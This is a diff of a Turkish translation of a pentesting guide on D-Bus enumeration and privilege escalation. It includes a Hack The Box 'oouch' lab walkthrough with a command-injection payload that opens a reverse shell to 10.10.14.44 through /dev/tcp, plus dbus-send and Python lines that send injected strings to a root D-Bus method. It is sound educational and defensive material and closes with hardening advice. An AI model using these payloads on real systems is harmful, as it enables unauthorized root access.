@@ -4,9 +4,9 @@
 
 ## **GUI enumeration**
 
-D-Bus, Ubuntu masaüstü ortamlarında süreçler arası iletişim (IPC) arabulucusu olarak kullanılmaktadır. Ubuntu'da, birkaç mesaj otobüsünün eşzamanlı çalışması gözlemlenmektedir: **sistem otobüsü**, esasen **sistem genelinde ilgili hizmetleri sergilemek için ayrıcalıklı hizmetler tarafından kullanılan** ve her giriş yapmış kullanıcı için yalnızca o kullanıcıya özgü hizmetleri sergileyen bir oturum otobüsü. Burada odak, ayrıcalıkları yükseltme amacımız olduğundan, daha yüksek ayrıcalıklarla (örneğin, root) çalışan hizmetlerle ilişkisi nedeniyle sistem otobüsü üzerinedir. D-Bus'un mimarisinin, istemcilerin iletişim kurmak istedikleri hizmet için belirttikleri adrese göre istemci mesajlarını uygun hizmetlere yönlendiren bir 'yönlendirici' kullandığı belirtilmektedir.
+D-Bus, Ubuntu masaüstü ortamlarında süreçler arası iletişim (IPC) arabulucusu olarak kullanılmaktadır. Ubuntu'da, birkaç mesaj otobüsünün eşzamanlı çalışması gözlemlenmektedir: **sistem otobüsü**, esasen **sistem genelinde ilgili hizmetleri sergilemek için ayrıcalıklı hizmetler tarafından kullanılan** ve her giriş yapmış kullanıcı için yalnızca o kullanıcıya özgü hizmetleri sergileyen bir oturum otobüsü. Burada odak, ayrıcalıkları yükseltme amacımız olduğundan, daha yüksek ayrıcalıklarla (örneğin, root) çalışan hizmetlerle ilişkili olması nedeniyle esas olarak sistem otobüsüne yöneliktir. D-Bus'un mimarisinin, istemcilerin iletişim kurmak istedikleri hizmet için belirttikleri adrese göre istemci mesajlarını uygun hizmetlere yönlendirmekten sorumlu bir 'yönlendirici' kullandığı belirtilmektedir.
 
-D-Bus üzerindeki hizmetler, sergiledikleri **nesneler** ve **arayüzler** ile tanımlanır. Nesneler, standart OOP dillerindeki sınıf örneklerine benzetilebilir; her örnek, bir **nesne yolu** ile benzersiz bir şekilde tanımlanır. Bu yol, bir dosya sistemi yoluna benzer şekilde, hizmet tarafından sergilenen her nesneyi benzersiz bir şekilde tanımlar. Araştırma amaçları için önemli bir arayüz, **org.freedesktop.DBus.Introspectable** arayüzüdür ve tek bir yöntemi, Introspect'i içerir. Bu yöntem, nesnenin desteklediği yöntemlerin, sinyallerin ve özelliklerin XML temsilini döndürür; burada yöntemlere odaklanılmakta, özellikler ve sinyaller hariç tutulmaktadır.
+D-Bus üzerindeki hizmetler, sergiledikleri **nesneler** ve **arayüzler** ile tanımlanır. Nesneler, standart OOP dillerindeki sınıf örneklerine benzetilebilir; her örnek, bir **nesne yolu** ile benzersiz bir şekilde tanımlanır. Bu yol, bir dosya sistemi yoluna benzer şekilde, hizmet tarafından sergilenen her nesneyi benzersiz bir şekilde tanımlar. Araştırma amaçları için önemli bir arayüz, **org.freedesktop.DBus.Introspectable** arayüzüdür ve tek bir yöntemi, Introspect'i içerir. Bu yöntem, nesnenin desteklediği yöntemlerin, sinyallerin ve özelliklerin XML temsiline döner; burada yöntemlere odaklanılmakta, özellikler ve sinyaller hariç tutulmaktadır.
 
 D-Bus arayüzü ile iletişim kurmak için iki araç kullanılmıştır: D-Bus tarafından sergilenen yöntemlerin betiklerde kolayca çağrılmasını sağlamak için **gdbus** adlı bir CLI aracı ve her otobüsteki mevcut hizmetleri listelemek ve her hizmetteki nesneleri görüntülemek için tasarlanmış Python tabanlı bir GUI aracı olan [**D-Feet**](https://wiki.gnome.org/Apps/DFeet).
 ```bash
@@ -16,13 +16,13 @@ sudo apt-get install d-feet
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-İlk resimde D-Bus sistem otobüsüne kaydedilen hizmetler gösterilmektedir, **org.debin.apt** özellikle Sistem Otobüsü butonunu seçtikten sonra vurgulanmıştır. D-Feet bu hizmetten nesneleri sorgular, seçilen nesneler için arayüzleri, yöntemleri, özellikleri ve sinyalleri gösterir, bu ikinci resimde görülmektedir. Her yöntemin imzası da detaylandırılmıştır.
+İlk görüntüde D-Bus sistem veriyolu ile kaydedilen hizmetler gösterilmektedir, **org.debin.apt** özellikle Sistem Veriyolu düğmesi seçildikten sonra vurgulanmıştır. D-Feet bu hizmetten nesneleri sorgular, seçilen nesneler için arayüzleri, yöntemleri, özellikleri ve sinyalleri gösterir, bu ikinci görüntüde görülmektedir. Her yöntemin imzası da detaylandırılmıştır.
 
 Dikkate değer bir özellik, hizmetin **işlem kimliği (pid)** ve **komut satırı** bilgilerini göstermesidir; bu, hizmetin yükseltilmiş ayrıcalıklarla çalışıp çalışmadığını doğrulamak için faydalıdır, araştırma açısından önemlidir.
 
 **D-Feet ayrıca yöntem çağrısı yapmaya da olanak tanır**: kullanıcılar, D-Feet'in hizmete iletmeden önce D-Bus türlerine dönüştürdüğü Python ifadelerini parametre olarak girebilirler.
 
-Ancak, **bazı yöntemlerin kimlik doğrulaması gerektirdiğini** unutmayın; bu yöntemleri çağırmamıza izin vermeden önce kimlik doğrulaması gerektirir. Amacımız, öncelikle kimlik bilgisi olmadan ayrıcalıklarımızı yükseltmek olduğundan bu yöntemleri göz ardı edeceğiz.
+Ancak, **bazı yöntemlerin kimlik doğrulaması gerektirdiğini** unutmayın; bu yöntemleri çağırmamıza izin vermeden önce kimlik doğrulaması gerektirir. Amacımız, öncelikle kimlik bilgisi olmadan ayrıcalıklarımızı yükseltmek olduğu için bu yöntemleri göz ardı edeceğiz.
 
 Ayrıca, bazı hizmetlerin, bir kullanıcının belirli eylemleri gerçekleştirmesine izin verilip verilmeyeceğini sorgulamak için org.freedeskto.PolicyKit1 adlı başka bir D-Bus hizmetini sorguladığını unutmayın.
 
@@ -56,7 +56,7 @@ org.freedesktop.locale1                  - -               -                (act
 ```
 #### Bağlantılar
 
-[Wikipedia'dan:](https://en.wikipedia.org/wiki/D-Bus) Bir süreç bir busa bağlantı kurduğunda, bus bu bağlantıya _benzersiz bağlantı adı_ olarak adlandırılan özel bir bus adı atar. Bu tür bus adları değişmezdir—bağlantı var olduğu sürece değişmeyecekleri garanti edilir—ve daha da önemlisi, bus ömrü boyunca yeniden kullanılamazlar. Bu, o bus'a başka bir bağlantının asla böyle bir benzersiz bağlantı adı almayacağı anlamına gelir, aynı süreç bus'a olan bağlantıyı kapatıp yeni bir tane oluşturursa bile. Benzersiz bağlantı adları, aksi takdirde yasak olan, iki nokta üst üste karakteri ile başladıkları için kolayca tanınabilir.
+[Wikipedia'dan:](https://en.wikipedia.org/wiki/D-Bus) Bir süreç bir busa bağlantı kurduğunda, bus bu bağlantıya _benzersiz bağlantı adı_ olarak adlandırılan özel bir bus adı atar. Bu tür bus adları değişmezdir—bağlantı var olduğu sürece değişmeyecekleri garanti edilir—ve daha da önemlisi, bus ömrü boyunca yeniden kullanılamazlar. Bu, o bus'a başka bir bağlantının asla böyle bir benzersiz bağlantı adı almayacağı anlamına gelir, aynı süreç bus'a olan bağlantıyı kapatıp yeni bir tane oluşturursa bile. Benzersiz bağlantı adları, aksi takdirde yasak olan iki nokta üst üste karakteri ile başladıkları için kolayca tanınabilir.
 
 ### Servis Nesnesi Bilgisi
 
@@ -150,16 +150,16 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Not edin ki `htb.oouch.Block` arayüzünün `.Block` metodu (ilgilendiğimiz). Diğer sütunlardaki "s" bir string beklediğini gösterebilir.
+Not edin ki `htb.oouch.Block` arayüzünün `.Block` metodu (ilgilendiğimiz olan). Diğer sütunlardaki "s" bir string beklediğini gösterebilir.
 
 ### İzleme/Yakalama Arayüzü
 
 Yeterli ayrıcalıklara sahip olduğunuzda (sadece `send_destination` ve `receive_sender` ayrıcalıkları yeterli değildir) **D-Bus iletişimini izleyebilirsiniz**.
 
-Bir **iletişimi izlemek** için **root** olmanız gerekecek. Hala root olma konusunda sorun yaşıyorsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) adreslerine bakın.
+Bir **iletişimi izlemek** için **root** olmanız gerekecek. Eğer root olmanıza rağmen sorun yaşıyorsanız [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) ve [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) adreslerine bakın.
 
 > [!WARNING]
-> Eğer D-Bus yapılandırma dosyasını **root olmayan kullanıcıların iletişimi dinlemesine izin verecek şekilde** nasıl yapılandıracağınızı biliyorsanız lütfen **benimle iletişime geçin**!
+> Eğer D-Bus yapılandırma dosyasını **root olmayan kullanıcıların iletişimi dinlemesine izin verecek şekilde yapılandırmayı** biliyorsanız lütfen **benimle iletişime geçin**!
 
 İzleme için farklı yollar:
 ```bash
@@ -194,7 +194,7 @@ Eğer bus'ta çok fazla bilgi varsa, şöyle bir eşleşme kuralı geçirin:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-Birden fazla kural belirtilebilir. Eğer bir mesaj _herhangi_ bir kural ile eşleşirse, mesaj yazdırılacaktır. Şöyle:
+Birden fazla kural belirtilebilir. Eğer bir mesaj _herhangi_ bir kural ile eşleşiyorsa, mesaj yazdırılacaktır. Böyle:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -210,7 +210,7 @@ Daha fazla bilgi için [D-Bus belgelerine](http://dbus.freedesktop.org/doc/dbus-
 
 ## **Zayıf Senaryo**
 
-**HTB'den "oouch" ana bilgisayarında qtc kullanıcısı olarak** _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda bulunan **beklenmedik bir D-Bus yapılandırma dosyası** bulabilirsiniz:
+**HTB'den "oouch" ana bilgisayarı içindeki qtc kullanıcısı olarak**, _/etc/dbus-1/system.d/htb.oouch.Block.conf_ konumunda bulunan **beklenmedik bir D-Bus yapılandırma dosyası** bulabilirsiniz:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
@@ -245,12 +245,12 @@ response = block_iface.Block(client_ip)
 bus.close()
 return render_template('hacker.html', title='Hacker')
 ```
-Gördüğünüz gibi, **D-Bus arayüzüne bağlanıyor** ve **"Block" fonksiyonuna** "client_ip" gönderiyor.
+Gördüğünüz gibi, **bir D-Bus arayüzüne bağlanıyor** ve **"Block" fonksiyonuna** "client_ip" gönderiyor.
 
 D-Bus bağlantısının diğer tarafında bazı C derlenmiş ikili dosyalar çalışıyor. Bu kod, D-Bus bağlantısında **IP adresini dinliyor ve verilen IP adresini engellemek için `system` fonksiyonu aracılığıyla iptables'ı çağırıyor.**\
 **`system` çağrısı, komut enjeksiyonuna karşı kasıtlı olarak savunmasızdır, bu nedenle aşağıdaki gibi bir yük, ters bir shell oluşturacaktır:** `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-### Sömür
+### Bunu Sömür
 
 Bu sayfanın sonunda **D-Bus uygulamasının tam C kodunu** bulabilirsiniz. İçinde, 91-97. satırlar arasında **`D-Bus nesne yolu`** **ve `arayüz adı`nın** **nasıl kaydedildiğini** bulabilirsiniz. Bu bilgi, D-Bus bağlantısına bilgi göndermek için gerekli olacaktır:
 ```c
@@ -268,7 +268,7 @@ SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Aşağıdaki python kodu, `block_iface.Block(runme)` aracılığıyla `Block` metoduna D-Bus bağlantısına yükü gönderecektir (_önceki kod parçasından alındığını unutmayın_):
+Aşağıdaki python kodu, yükü `block_iface.Block(runme)` aracılığıyla `Block` metoduna D-Bus bağlantısına gönderecektir (_önceki kod parçasından alındığını unutmayın_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -282,12 +282,12 @@ bus.close()
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
-- `dbus-send`, "Mesaj Otobüsü"na mesaj göndermek için kullanılan bir araçtır.
-- Mesaj Otobüsü – Sistemlerin uygulamalar arasında iletişim kurmasını kolaylaştıran bir yazılımdır. Mesaj Kuyruğu ile ilgilidir (mesajlar sıralı bir şekilde düzenlenir) ancak Mesaj Otobüsü'nde mesajlar bir abonelik modeli ile gönderilir ve ayrıca çok hızlıdır.
+- `dbus-send`, "Message Bus" a mesaj göndermek için kullanılan bir araçtır.
+- Message Bus – Sistemlerin uygulamalar arasında iletişim kurmasını kolaylaştıran bir yazılımdır. Mesaj Kuyruğu ile ilişkilidir (mesajlar sıralı bir şekilde düzenlenir) ancak Message Bus'ta mesajlar bir abonelik modeli ile gönderilir ve ayrıca çok hızlıdır.
 - “-system” etiketi, bunun bir oturum mesajı değil, bir sistem mesajı olduğunu belirtmek için kullanılır (varsayılan olarak).
 - “–print-reply” etiketi, mesajımızı uygun bir şekilde yazdırmak ve herhangi bir yanıtı insan tarafından okunabilir bir formatta almak için kullanılır.
 - “–dest=Dbus-Interface-Block” Dbus arayüzünün adresidir.
-- “–string:” – Arayüze göndermek istediğimiz mesajın türüdür. Mesaj göndermenin birkaç formatı vardır; çift, bayt, boolean, int, objpath gibi. Bunlar arasında, "nesne yolu", bir dosyanın yolunu Dbus arayüzüne göndermek istediğimizde kullanışlıdır. Bu durumda, bir dosya adıyla arayüze bir komut iletmek için özel bir dosya (FIFO) kullanabiliriz. “string:;” – Bu, FIFO ters kabuk dosyası/komutunu yerleştirdiğimiz yerden nesne yolunu tekrar çağırmak içindir.
+- “–string:” – Arayüze göndermek istediğimiz mesajın türüdür. Mesaj göndermenin birkaç formatı vardır; bunlar arasında double, bytes, booleans, int, objpath bulunmaktadır. Bunlardan “object path”, bir dosyanın yolunu Dbus arayüzüne göndermek istediğimizde kullanışlıdır. Bu durumda, bir dosya adıyla arayüze bir komut iletmek için özel bir dosya (FIFO) kullanabiliriz. “string:;” – Bu, FIFO ters shell dosyası/komutunu yerleştirdiğimiz yerden nesne yolunu tekrar çağırmak içindir.
 
 _Dikkat edin ki `htb.oouch.Block.Block` içinde, ilk kısım (`htb.oouch.Block`) hizmet nesnesini, son kısım ise (`.Block`) yöntem adını referans alır._
 
@@ -447,7 +447,7 @@ sudo dbus-map --dump-methods
 # Polkit istemleri olmadan erişebileceğiniz yöntemleri/özellikleri aktif olarak sorgulayın
 sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
 ```
-* Araç, korunmasız bilinen adları `!` ile işaretler, böylece *sahip olabileceğiniz* (devralabileceğiniz) hizmetleri veya yetkisiz bir kabuk üzerinden erişilebilen yöntem çağrılarını anında ortaya çıkarır.
+* Araç, korunmasız bilinen adları `!` ile işaretler, böylece *sahip olabileceğiniz* (devralabileceğiniz) hizmetleri veya yetkisiz bir kabuktan erişilebilen yöntem çağrılarını anında ortaya çıkarır.
 
 ### uptux.py
 * Yazar: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
@@ -488,7 +488,7 @@ Bir yamanın uygun `polkit_authority_check_authorization()` mantığını geri t
 ```bash
 grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
 ```
-* Tehlikeli yöntemler için Polkit gerektirin – hatta *kök* proxy'ler, kendi PID'lerini `polkit_authority_check_authorization_sync()`'e iletmelidir.
+* Tehlikeli yöntemler için Polkit gerektirin – hatta *kök* proxy'ler bile kendi PID'lerini `polkit_authority_check_authorization_sync()`'a iletmelidir.
 * Uzun süreli yardımcı programlarda ayrıcalıkları düşürün (otobüse bağlandıktan sonra ad alanlarını değiştirmek için `sd_pid_get_owner_uid()` kullanın).
 * Bir hizmeti kaldıramıyorsanız, en azından onu özel bir Unix grubuna *sınırlayın* ve XML politikasında erişimi kısıtlayın.
 * Mavi takım: `busctl capture --output=/var/log/dbus_$(date +%F).pcap` ile sistem otobüsünün sürekli yakalanmasını etkinleştirin ve anomali tespiti için Wireshark'a aktarın.
